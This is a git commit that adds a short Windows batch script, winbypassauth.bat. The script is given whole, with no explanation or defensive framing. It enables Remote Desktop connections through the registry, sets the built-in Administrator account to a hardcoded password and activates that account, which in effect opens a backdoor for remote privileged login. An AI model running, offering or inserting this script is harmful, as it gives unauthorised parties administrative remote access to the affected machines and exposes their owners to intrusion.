ba45bb162e5b195b9d5cbe040b9604c9ff242518
Egor Erastov <qtstm32fan@qtstm32fan.xyz>
2022-03-12 15:10:42 +0300

    Create winbypassauth.bat

---
+++ winbypassauth.bat
@@ -0,0 +1,3 @@
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+net user Администратор 1357986Ui!
+net user Администратор /active:yes
